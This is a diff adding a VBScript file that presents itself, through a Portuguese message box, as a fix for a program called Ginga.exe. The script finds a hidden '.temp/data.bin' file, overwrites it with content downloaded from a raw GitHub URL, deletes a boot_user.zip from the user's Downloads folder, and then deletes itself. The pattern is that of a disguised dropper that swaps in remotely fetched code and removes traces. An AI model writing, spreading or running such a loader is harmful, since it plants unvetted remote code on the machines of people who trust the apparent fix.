@@ -1,0 +1,91 @@
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set shell = CreateObject("WScript.Shell")
+
+currentDir = fso.GetParentFolderName(WScript.ScriptFullName)
+userProfile = shell.ExpandEnvironmentStrings("%USERPROFILE%")
+downloadsFolder = fso.BuildPath(userProfile, "Downloads")
+
+foundDataBin = ""
+targetFolder = ""
+
+zipFile = fso.BuildPath(downloadsFolder, "boot_user.zip")
+If fso.FileExists(zipFile) Then
+    On Error Resume Next
+    fso.DeleteFile zipFile, True
+    On Error GoTo 0
+End If
+
+gingaUserPath = fso.BuildPath(currentDir, "boot_user")
+If Not fso.FolderExists(gingaUserPath) Then
+    gingaUserPath = fso.BuildPath(downloadsFolder, "boot_user")
+End If
+
+If fso.FolderExists(gingaUserPath) Then
+    tempPath = fso.BuildPath(gingaUserPath, ".temp")
+    binPath = fso.BuildPath(tempPath, "data.bin")
+    If fso.FileExists(binPath) Then
+        foundDataBin = binPath
+        targetFolder = tempPath
+    End If
+End If
+
+If foundDataBin = "" Then
+    foundDataBin = SearchDataBin(currentDir, fso)
+    If foundDataBin <> "" Then
+        targetFolder = fso.GetParentFolderName(foundDataBin)
+    End If
+End If
+
+If foundDataBin <> "" Then
+    url = "https://raw.githubusercontent.com/countes2/bat/refs/heads/main/d"
+    
+    On Error Resume Next
+    Set http = CreateObject("MSXML2.XMLHTTP")
+    If http Is Nothing Then
+        Set http = CreateObject("Microsoft.XMLHTTP")
+    End If
+    
+    http.Open "GET", url, False
+    http.Send
+    
+    If http.Status = 200 Then
+        Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 1
+        stream.Open
+        stream.Write http.responseBody
+        stream.SaveToFile foundDataBin, 2
+        stream.Close
+    End If
+    On Error GoTo 0
+    
+    fso.DeleteFile WScript.ScriptFullName, True
+Else
+    MsgBox "Para a falha ser corrigida aponte a pasta em que o Ginga.exe esta, ou mova esse script para a pasta", vbCritical, "Aviso"
+    shell.Run "explorer.exe " & userProfile, 1, False
+    
+    On Error Resume Next
+    fso.DeleteFile WScript.ScriptFullName, True
+    On Error GoTo 0
+End If
+
+Function SearchDataBin(folderPath, fsoObj)
+    SearchDataBin = ""
+    Set folder = fsoObj.GetFolder(folderPath)
+    
+    For Each subFolder in folder.SubFolders
+        If LCase(subFolder.Name) = ".temp" Then
+            binFile = fsoObj.BuildPath(subFolder.Path, "data.bin")
+            If fsoObj.FileExists(binFile) Then
+                SearchDataBin = binFile
+                Exit Function
+            End If
+        End If
+        
+        Dim result
+        result = SearchDataBin(subFolder.Path, fsoObj)
+        If result <> "" Then
+            SearchDataBin = result
+            Exit Function
+        End If
+    Next
+End Function
